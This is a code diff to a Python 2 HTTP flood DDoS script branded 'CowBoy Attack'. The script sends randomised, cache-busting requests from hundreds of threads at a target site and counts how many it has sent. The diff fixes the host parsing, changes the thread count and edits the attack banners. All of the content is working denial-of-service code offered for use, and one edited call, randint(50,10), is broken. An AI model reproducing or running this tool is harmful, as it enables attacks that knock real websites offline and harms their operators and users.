@@ -66,6 +66,9 @@ def referer_list():
 	headers_referers.append('http://www.sogou.com/web?query=')
 	headers_referers.append('http://api.duckduckgo.com/html/?q=')
 	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
+	headers_referers.append('http://' + host + '/')
+	return(headers_referers)
+
 
 # generates a Keyword list	
 def keyword_list():
@@ -98,14 +101,12 @@ def keyword_list():
         keyword_top.append('Anonymous')
         keyword_top.append('DJ Bach')
 
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
 	
-#builds random ascii string
+#builds random ascii string/////////////////////////////////////////////////////////////
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(65, 160)
+		a = random.randint(65, 90)
 		out_str += chr(a)
 	return(out_str)
 
@@ -158,8 +159,8 @@ def httpcall(url):
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
-	request.add_header('Keep-Alive', random.randint(110,160))
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,10)))
+	request.add_header('Keep-Alive', random.randint(110,120))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
@@ -199,11 +200,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+150<request_counter) & (previous<>request_counter):
-				print "#~~~>iStorm DDoS Attack's Sended: %d Sending more<~~~#" % (request_counter)
+			if (previous+100<request_counter) & (previous<>request_counter):
+				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n ~>Stopping the mass DDoS Attack<~"
+			print "\n-- CowBoy Attack Fnieshed --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -214,17 +215,20 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print("CowBoy Attack The Server And Databases")
-		print("MADE BY D1MOD")
+		print "-- CowBoy Attack Started --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		for i in range(10000):
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+		host = m.group(2)
+		for i in range(500):
 			t = HTTPThread()
 			t.start()
+		t = MonitorThread()
+		t.start()
 		t = MonitorThread()
 		t = MonitorThread()
 		t = MonitorThread()
